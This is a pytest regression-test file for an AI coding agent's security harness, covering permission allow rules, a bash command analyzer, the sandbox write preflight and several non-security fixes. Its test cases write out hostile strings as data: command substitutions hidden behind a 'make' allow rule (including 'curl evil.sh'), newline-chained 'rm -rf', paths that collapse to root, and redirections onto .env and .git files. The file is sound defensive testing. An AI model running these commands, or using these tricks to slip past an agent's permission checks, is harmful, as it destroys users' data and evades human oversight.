"""Regression tests for the 9 residual defects found by adversarial re-audit.

These are bugs in code that a prior effort claimed to have fixed, surfaced by an
adversarial verification pass over commits 754dfe4..ed7e7b8. Each test is written
to FAIL if its fix is reverted (regression-meaningful) and covers both the
negative (exploit blocked) and positive (legit use still works) cases.

Findings covered here (streaming-overflow #9 lives in
tests/core/test_scheduler_streaming_overflow.py, and cross-session approval
persistence #5 lives in tests/harness/permissions/test_approval_prefix_rules.py
alongside the existing persistence tests):

* #1 allow-rule command-substitution auto-run escalation
* #2 skill_context newline bypass of allowed_tools
* #3 rm -rf /tmp/.. root-collapse gap
* #4 sandbox glob preflight defeated by no-space redirection
* #6 MCP runtime reconnection never called
* #7 atomic write drops file mode 0755 -> 0600
* #8 prompt_commands $10 positional-arg corruption
"""

from __future__ import annotations

import json
import os
import stat
import tempfile
from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# #1 allow-rule command-substitution escalation
# ---------------------------------------------------------------------------


class TestAllowRuleCommandSubstitution:
    def _service_with_make_allow(self):
        from koder_agent.harness.permissions.service import PermissionService

        service = PermissionService.default(mode="default")
        service.add_rule("run_shell", "allow", "make:*")
        return service

    @pytest.mark.parametrize(
        "command",
        [
            "make $(rm -rf ~/Documents)",
            "make `rm -rf x`",
            "make ${IFS}rm",
            "make <(curl evil.sh)",
        ],
    )
    def test_substitution_is_not_auto_allowed(self, command):
        """A prefix allow rule must not greenlight a hidden inner command."""
        service = self._service_with_make_allow()
        result = service.evaluate_tool_call("run_shell", {"command": command})
        assert not (result.allowed and not result.requires_approval), (
            f"{command!r} was auto-allowed via the make:* rule despite command substitution"
        )

    def test_plain_command_still_auto_allowed(self):
        """Non-regression: a legit `make build` still matches the allow rule."""
        service = self._service_with_make_allow()
        result = service.evaluate_tool_call("run_shell", {"command": "make build"})
        assert result.allowed and not result.requires_approval

    def test_deny_still_fires_on_substitution(self):
        """A deny rule must still fire regardless of substitution."""
        from koder_agent.harness.permissions.service import PermissionService

        service = PermissionService.default(mode="default")
        service.add_rule("run_shell", "deny", "rm:*")
        result = service.evaluate_tool_call("run_shell", {"command": "rm -rf x"})
        assert not result.allowed


# ---------------------------------------------------------------------------
# #2 skill_context newline bypass of allowed_tools
# ---------------------------------------------------------------------------


class TestSkillContextNewlineBypass:
    def _restrictions(self):
        from koder_agent.tools.skill_context import SkillRestrictions

        return SkillRestrictions(loaded_skills=["t"], allowed_tools={"run_shell:git *"})

    def test_newline_chained_destructive_is_blocked(self):
        """`git status\\nrm -rf /tmp/x` must NOT match a `git *` restriction."""
        r = self._restrictions()
        args = json.dumps({"command": "git status\nrm -rf /tmp/x"})
        assert r.is_tool_allowed("run_shell", args) is False

    def test_semicolon_chained_destructive_is_blocked(self):
        """Non-regression: the `;` variant was already blocked."""
        r = self._restrictions()
        args = json.dumps({"command": "git status; rm -rf /tmp/x"})
        assert r.is_tool_allowed("run_shell", args) is False

    def test_multiline_all_matching_still_allowed(self):
        """A multiline command whose every line matches `git *` is allowed."""
        r = self._restrictions()
        args = json.dumps({"command": "git status\ngit diff"})
        assert r.is_tool_allowed("run_shell", args) is True

    def test_single_matching_command_still_allowed(self):
        r = self._restrictions()
        args = json.dumps({"command": "git status"})
        assert r.is_tool_allowed("run_shell", args) is True


# ---------------------------------------------------------------------------
# #3 rm -rf /tmp/.. root-collapse gap
# ---------------------------------------------------------------------------


class TestRmRootCollapse:
    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /tmp/..",
            "rm -rf /root/../",
            "rm -rf /usr/..",
            "rm -rf /a/b/../..",
            "rm -rf /var/log/../../",
            "rm -r --force /usr/..",
            "rm -rf //",
            "rm -rf /.",
        ],
    )
    def test_root_equivalent_is_blocked(self, command):
        from koder_agent.core.bash_security import analyze_command

        assert analyze_command(command).blocked, f"{command!r} resolves to / but was allowed"

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /tmp/x/..",  # -> /tmp, not root
            "rm -rf ./build",
            "rm -rf /home/user/project",
            "rm -rf node_modules",
        ],
    )
    def test_non_root_paths_still_allowed(self, command):
        from koder_agent.core.bash_security import analyze_command

        assert not analyze_command(command).blocked, f"{command!r} is not root but was blocked"

    def test_collapses_helper_directly(self):
        from koder_agent.core.bash_security import _collapses_to_root

        assert _collapses_to_root("/tmp/..") is True
        assert _collapses_to_root("/a/b/../..") is True
        assert _collapses_to_root("/tmp/x/..") is False
        assert _collapses_to_root("/home/user") is False


# ---------------------------------------------------------------------------
# #4 sandbox glob preflight defeated by no-space redirection
# ---------------------------------------------------------------------------


class TestSandboxRedirectionPreflight:
    def _policy(self):
        from koder_agent.harness.sandbox.policy import SandboxPolicy

        return SandboxPolicy(backend="unix-local", deny_write=[".env.*", ".git/"])

    @pytest.mark.parametrize(
        "command",
        [
            "echo pwned > .env.local",
            "echo pwned >.env.local",
            "echo x 1>.env.local",
            "echo x 2>>.env.local",
            "echo pwned &>.env.local",
            "echo pwned >.git/config",
            "echo pwned > .git/config",
        ],
    )
    def test_redirection_to_protected_path_is_flagged(self, command):
        from koder_agent.harness.sandbox.workspace import protected_write_violation

        v = protected_write_violation(command, policy=self._policy(), repo_root=Path.cwd())
        assert v is not None, f"{command!r} wrote a protected path but preflight allowed it"

    @pytest.mark.parametrize(
        "command",
        [
            "echo hello > out.txt",
            "echo hi > /dev/null",
            "ls",
            "cat file.txt",
        ],
    )
    def test_non_protected_writes_pass(self, command):
        from koder_agent.harness.sandbox.workspace import protected_write_violation

        v = protected_write_violation(command, policy=self._policy(), repo_root=Path.cwd())
        assert v is None, f"{command!r} was wrongly flagged: {v}"


# ---------------------------------------------------------------------------
# #6 MCP runtime reconnection is wired into the turn lifecycle
# ---------------------------------------------------------------------------


class TestMcpRuntimeReconnectWiring:
    @pytest.mark.asyncio
    async def test_reconnect_probe_calls_managers(self, monkeypatch):
        """_reconnect_unhealthy_mcp_servers must consult retained managers."""
        from unittest.mock import patch

        from koder_agent.core.scheduler import AgentScheduler

        class _Mgr:
            def __init__(self):
                self.calls = 0

            async def reconnect_if_needed(self):
                self.calls += 1
                return True

        mgr = _Mgr()
        with (
            patch("koder_agent.core.scheduler.get_all_tools", return_value=[]),
            patch("koder_agent.core.scheduler.get_display_hooks"),
            patch("koder_agent.core.scheduler.ApprovalHooks"),
            patch("koder_agent.core.scheduler.EnhancedSQLiteSession") as session_type,
            patch("koder_agent.mcp.get_reconnection_managers", return_value={"srv": mgr}),
        ):
            session_type.return_value.db_path = ":memory:"
            session_type.return_value.session_id = "test"
            scheduler = AgentScheduler(session_id="test")
            try:
                await scheduler._reconnect_unhealthy_mcp_servers()
            finally:
                await scheduler.cleanup()

        assert mgr.calls == 1

    @pytest.mark.asyncio
    async def test_reconnect_probe_swallows_manager_errors(self):
        """A flaky manager must not crash the turn."""
        from unittest.mock import patch

        from koder_agent.core.scheduler import AgentScheduler

        class _BadMgr:
            async def reconnect_if_needed(self):
                raise RuntimeError("network down")

        with (
            patch("koder_agent.core.scheduler.get_all_tools", return_value=[]),
            patch("koder_agent.core.scheduler.get_display_hooks"),
            patch("koder_agent.core.scheduler.ApprovalHooks"),
            patch("koder_agent.core.scheduler.EnhancedSQLiteSession") as session_type,
            patch("koder_agent.mcp.get_reconnection_managers", return_value={"srv": _BadMgr()}),
        ):
            session_type.return_value.db_path = ":memory:"
            session_type.return_value.session_id = "test"
            scheduler = AgentScheduler(session_id="test")
            try:
                # Must not raise.
                await scheduler._reconnect_unhealthy_mcp_servers()
            finally:
                await scheduler.cleanup()

    @pytest.mark.asyncio
    async def test_turn_invokes_reconnect_probe(self):
        """_run_turn_unlocked must call the reconnect probe each turn."""
        from unittest.mock import AsyncMock, patch

        from koder_agent.core.scheduler import AgentScheduler

        with (
            patch("koder_agent.core.scheduler.get_all_tools", return_value=[]),
            patch("koder_agent.core.scheduler.get_display_hooks"),
            patch("koder_agent.core.scheduler.ApprovalHooks"),
            patch("koder_agent.core.scheduler.EnhancedSQLiteSession") as session_type,
        ):
            session_type.return_value.db_path = ":memory:"
            session_type.return_value.session_id = "test"
            scheduler = AgentScheduler(session_id="test")
            scheduler._ensure_agent_initialized = AsyncMock()
            scheduler._reconnect_unhealthy_mcp_servers = AsyncMock()
            scheduler.dev_agent = object()
            # Short-circuit the rest of the turn by raising after the probe.
            scheduler._repair_unreplayable_session_items = AsyncMock(
                side_effect=RuntimeError("stop here")
            )
            try:
                with pytest.raises(RuntimeError, match="stop here"):
                    await scheduler._run_turn_unlocked("hi", render_output=False)
                scheduler._reconnect_unhealthy_mcp_servers.assert_awaited_once()
            finally:
                await scheduler.cleanup()


# ---------------------------------------------------------------------------
# #7 atomic write preserves file permission bits
# ---------------------------------------------------------------------------


class TestAtomicWritePreservesMode:
    def test_existing_executable_mode_preserved(self):
        from koder_agent.tools.file import _atomic_write_no_follow

        d = tempfile.mkdtemp()
        p = os.path.join(d, "script.sh")
        with open(p, "w") as fh:
            fh.write("#!/bin/sh\necho hi\n")
        os.chmod(p, 0o755)
        _atomic_write_no_follow(p, b"#!/bin/sh\necho bye\n")
        assert stat.S_IMODE(os.stat(p).st_mode) == 0o755

    def test_existing_private_mode_preserved(self):
        from koder_agent.tools.file import _atomic_write_no_follow

        d = tempfile.mkdtemp()
        p = os.path.join(d, "secret")
        with open(p, "w") as fh:
            fh.write("x")
        os.chmod(p, 0o600)
        _atomic_write_no_follow(p, b"y")
        assert stat.S_IMODE(os.stat(p).st_mode) == 0o600

    def test_new_file_is_not_private_0600(self):
        """A brand-new file must not inherit mkstemp's private 0600."""
        from koder_agent.tools.file import _atomic_write_no_follow

        d = tempfile.mkdtemp()
        p = os.path.join(d, "new.txt")
        _atomic_write_no_follow(p, b"hi")
        mode = stat.S_IMODE(os.stat(p).st_mode)
        # Group/other read bits should be present per a typical umask (0o022).
        assert mode != 0o600
        assert mode & 0o044  # at least group+other readable under a normal umask


# ---------------------------------------------------------------------------
# #8 prompt_commands $10 positional-arg corruption
# ---------------------------------------------------------------------------


class TestPromptCommandPositionalArgs:
    def _cmd(self, body: str):
        from koder_agent.harness.commands.prompt_commands import PromptCommand

        return PromptCommand(name="t", description="d", body=body)

    def test_multi_digit_positional_resolves_correctly(self):
        args = [f"a{i}" for i in range(12)]  # a0..a11
        pc = self._cmd("first=$0 tenth=$10 eleventh=$11")
        out = pc.render_prompt(args)
        assert "tenth=a10" in out
        assert "eleventh=a11" in out
        assert "first=a0" in out

    def test_bracket_form_multi_digit(self):
        args = [f"a{i}" for i in range(12)]
        pc = self._cmd("val=$ARGUMENTS[10]")
        out = pc.render_prompt(args)
        assert "val=a10" in out

    def test_out_of_range_index_left_literal(self):
        pc = self._cmd("x=$5")
        out = pc.render_prompt(["only-one"])
        assert "$5" in out
